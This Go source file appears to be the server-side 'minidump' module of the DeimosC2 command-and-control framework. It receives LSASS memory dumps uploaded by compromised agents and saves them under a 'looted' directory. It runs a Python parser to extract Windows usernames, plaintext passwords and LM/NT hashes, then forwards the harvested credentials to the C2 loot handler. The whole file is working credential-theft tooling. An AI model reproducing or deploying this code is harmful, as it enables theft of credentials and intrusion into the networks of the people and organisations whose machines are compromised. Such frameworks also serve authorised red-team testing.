package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/rpc"
	"net/rpc/jsonrpc"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"sync"

	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/logging"
	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/modulescommon"
)

//ModData is used for RPC
type ModData int

var wg sync.WaitGroup

var rpcPort = 63002
var client *rpc.Client

type downloadOutput struct {
	Filename string
	Filedata string
}

//global counter
var lsassCount = 0

//AllLSASSCreds is a global variable that holds all the LSASS creds
var AllLSASSCreds = map[int]*Lsass{}

//Lsass struct to save the output of parsing
type Lsass struct {
	SSP      string `json:"ssp"`
	Domain   string `json:"domain"`
	Username string `json:"username"`
	Password string `json:"password"`
	LMHash   string `json:"lmhash"`
	NTHash   string `json:"nthash"`
}

//CredsResponse used to parse slice
type CredsResponse struct {
	Credentials []Lsass
}

//Module is the datastructure of modules
type Module struct {
	Name string //Holds the name of the module
	Port int    //Holds the RPC port of the module server
}

func startModuleServer() {
	modRPC := new(ModData)
	rpc.Register(modRPC)
	rpc.HandleHTTP()
	var l net.Listener
	var e error
	for {
		s := strconv.Itoa(rpcPort)
		l, e = net.Listen("tcp", "127.0.0.1:"+s)
		if e == nil {
			break
		}
		rpcPort++
	}
	wg.Add(1)
	//go http.Serve(l, nil)
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}

		go rpc.ServeCodec(jsonrpc.NewServerCodec(conn))
	}

}

//RecData will take in data to be acted on from the server
func (t *ModData) RecData(data modulescommon.ModuleCom, reply *string) error {
	logging.Logger.Println("RecData called!")
	r := server(data)
	*reply = r
	return nil
}

//EndServer will be called in order to end the module
func (t *ModData) EndServer(end bool, reply *bool) error {
	if end == true {
		defer wg.Done()
	}
	return nil
}

func server(data modulescommon.ModuleCom) string {
	cwd, _ := os.Getwd()

	//Assign dmpFile content to the content of the struct downloadOutput
	var dmpFile downloadOutput
	json.Unmarshal(data.Data, &dmpFile)

	logging.Logger.Println(dmpFile.Filename)
	dmpData, _ := base64.StdEncoding.DecodeString(dmpFile.Filedata)
	fullPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", dmpFile.Filename)
	fileName := fmt.Sprintf(fullPath)
	file, _ := os.Create(fileName)
	//Writing the dmp file data to the file
	file.Write(dmpData)

	var reply []byte
	if strings.Contains(dmpFile.Filename, "lsass") {
		lsassPyFile := path.Join(cwd, "modules", "credentialaccess", "minidump", "server", "bin", "lsassparse.py")
		cmd := exec.Command("python", lsassPyFile, fullPath)
		out, _ := cmd.CombinedOutput()

		for _, line := range strings.Split(strings.TrimSuffix(string(out), "\n"), "\n") {
			creds := make([]Lsass, 0)
			json.Unmarshal([]byte(line), &creds)
			logging.Logger.Println("LSASS creds value are: ", creds)
			for _, data := range creds {
				newData := data
				AllLSASSCreds[lsassCount] = &newData
				lsassCount++
			}
		}

		//Saving the lsass_dump file
		lsassPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", "lsass_dump.json")
		lsassName := fmt.Sprintf(lsassPath)
		lsassFile, _ := json.MarshalIndent(AllLSASSCreds, "", "")
		_ = ioutil.WriteFile(lsassName, lsassFile, 0777)

		//Sending the LSASS JSON data to Loot handler
		LootLSASSmsg := modulescommon.ModOutput{
			AgentKey:   data.AgentKey,
			ModuleName: data.ModuleName,
			OutputType: "Loot",
			Output:     []byte("{\"Type\":\"LSASS\", \"Data\":" + string(lsassFile) + "}"),
		}

		client.Call("ModData.ModSendData", &LootLSASSmsg, &reply)
	}

	dumpMsg := modulescommon.ModOutput{
		AgentKey:   data.AgentKey,
		ModuleName: data.ModuleName,
		OutputType: "Link",
		Output:     []byte(filepath.Base(fullPath)),
	}

	client.Call("ModData.ModSendData", &dumpMsg, &reply)

	return ""
}

func main() {
	port := os.Args[1]
	//Starts up the local RPC server to recieve data
	go startModuleServer()
	//Makes the connection to the main server
	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("dialing:", err)
	}

	defer conn.Close()

	client = jsonrpc.NewClient(conn)

	m := Module{"minidump", rpcPort}

	var reply []byte
	//Registers with the main server
	err = client.Call("ModData.ModInit", m, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

	//Waits till the module is finished
	wg.Wait()
}
